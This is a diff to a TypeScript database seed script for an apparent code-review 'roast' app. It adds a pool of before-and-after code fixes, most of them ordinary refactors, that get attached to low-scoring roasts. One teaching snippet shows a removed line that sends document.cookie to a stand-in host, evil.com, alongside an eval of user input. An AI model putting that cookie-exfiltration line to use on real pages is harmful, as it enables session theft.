@@ -632,6 +632,165 @@ const GOOD_ISSUES: IssueTemplate[] = [
   },
 ]
 
+// ── Suggested fixes pool ─────────────────────────────────────────────────────
+
+const SUGGESTED_FIXES: string[] = [
+  // JS: var → const + for loop → reduce
+  ` function calculateTotal(items) {
+-  var total = 0;
+-  for (var i = 0; i < items.length; i++) {
+-    total = total + items[i].price;
+-  }
+-  if (total > 100) {
+-    console.log("discount applied");
+-    total = total * 0.9;
+-  }
+-  // TODO: handle tax
+-  return total
++  const subtotal = items.reduce((sum, item) => sum + item.price, 0);
++  const total = subtotal > 100 ? subtotal * 0.9 : subtotal;
++  return total;
+ }`,
+
+  // JS: eval + cookie leak
+  `-eval(prompt('Enter code'));
+-document.write(fetch('http://evil.com/?d='+document.cookie))
++// never use eval() with user input — execute known, trusted functions instead
++// never expose document.cookie to external URLs`,
+
+  // JS: isEven verbosity
+  ` function isEven(n) {
+-  if (n % 2 == 0) {
+-    return true
+-  } else {
+-    return false
+-  }
++  return n % 2 === 0;
+ }`,
+
+  // JS: sequential awaits → Promise.all
+  ` async function fetchData() {
+-  await sleep(2000)
+-  const a = await fetch('/api/a')
+-  await sleep(2000)
+-  const b = await fetch('/api/b')
+-  await sleep(2000)
+-  const c = await fetch('/api/c')
+-  return [a, b, c]
++  const [a, b, c] = await Promise.all([
++    fetch('/api/a'),
++    fetch('/api/b'),
++    fetch('/api/c'),
++  ]);
++  return [a, b, c];
+ }`,
+
+  // JS: empty catch
+  ` async function getUser(id) {
+   try {
+     const res = await fetch('/api/user/' + id)
+     const data = await res.json()
+     return data
+-  } catch(e) {}
++  } catch (e) {
++    console.error('getUser failed:', e)
++    return null
++  }
+ }`,
+
+  // TS: any overuse
+  ` function processData(data: any): any {
+-  const result: any = {}
+-  const keys: any[] = Object.keys(data as any)
+-  keys.forEach((k: any) => {
+-    result[k] = (data as any)[k]
+-  })
+-  return result as any
++  return { ...data }
+ }`,
+
+  // TS: String/Number wrapper types
+  ` interface User {
+-  name: String;
+-  age: Number;
+-  email: String;
+-  address: String;
+-  phone: String;
++  name: string;
++  age: number;
++  email: string;
++  address: string;
++  phone: string;
+ }`,
+
+  // TS: status chain → includes
+  `-function checkStatus(s: string) {
+-  if (s === "active") return true
+-  if (s === "inactive") return false
+-  if (s === "pending") return false
+-  if (s === "deleted") return false
+-  if (s === "banned") return false
+-  if (s === "suspended") return false
+-  return false
+-}
++type Status = "active" | "inactive" | "pending" | "deleted" | "banned" | "suspended"
++
++function checkStatus(s: Status): boolean {
++  return s === "active"
++}`,
+
+  // Python: bare except → typed exception
+  ` def divide(a, b):
+     try:
+         result = a / b
+         return result
+-    except:
+-        pass
++    except ZeroDivisionError:
++        return None`,
+
+  // Python: hardcoded secrets
+  ` import os
+-
+-password = "admin123"
+-db_host = "localhost"
+-db_user = "root"
+-db_pass = "password"
+-
+-def connect():
+-    return f"mysql://{db_user}:{db_pass}@{db_host}/prod"
++
++def connect():
++    db_url = os.environ["DATABASE_URL"]
++    return db_url`,
+
+  // Python: manual loop → list comprehension
+  `-l = [1,2,3,4,5,6,7,8,9,10]
+-r = []
+-for i in range(len(l)):
+-    if l[i] % 2 == 0:
+-        r.append(l[i] * l[i])
+-print(r)
++numbers = range(1, 11)
++result = [x * x for x in numbers if x % 2 == 0]
++print(result)`,
+
+  // SQL: SELECT *
+  `-SELECT * FROM users WHERE 1=1;
++SELECT id, name, email FROM users;`,
+
+  // SQL: implicit join → explicit JOIN
+  `-SELECT * FROM orders o, users u, products p
+-WHERE o.user_id = u.id
+-AND o.product_id = p.id
+-AND u.country = 'BR'
++SELECT o.id, u.name, p.title
++FROM orders o
++JOIN users u ON o.user_id = u.id
++JOIN products p ON o.product_id = p.id
++WHERE u.country = 'BR'`,
+]
+
 // ── Issue generation ──────────────────────────────────────────────────────────
 
 function pickRandom<T>(arr: T[]): T {
@@ -716,8 +875,11 @@ async function seed() {
       to: new Date(),
     })
 
+    // scores below 7 get a suggested fix ~80% of the time
+    const suggestedFix = score < 7 && Math.random() < 0.8 ? pickRandom(SUGGESTED_FIXES) : null
+
     const [roast] = await client`
-      INSERT INTO roasts (code, language, line_count, mode, score, verdict, roast_quote, created_at)
+      INSERT INTO roasts (code, language, line_count, mode, score, verdict, roast_quote, suggested_fix, created_at)
       VALUES (
         ${snippet.code},
         ${snippet.language},
@@ -726,6 +888,7 @@ async function seed() {
         ${score.toFixed(2)},
         ${verdict},
         ${generateRoastQuote(score)},
+        ${suggestedFix},
         ${createdAt.toISOString()}
       )
       RETURNING id
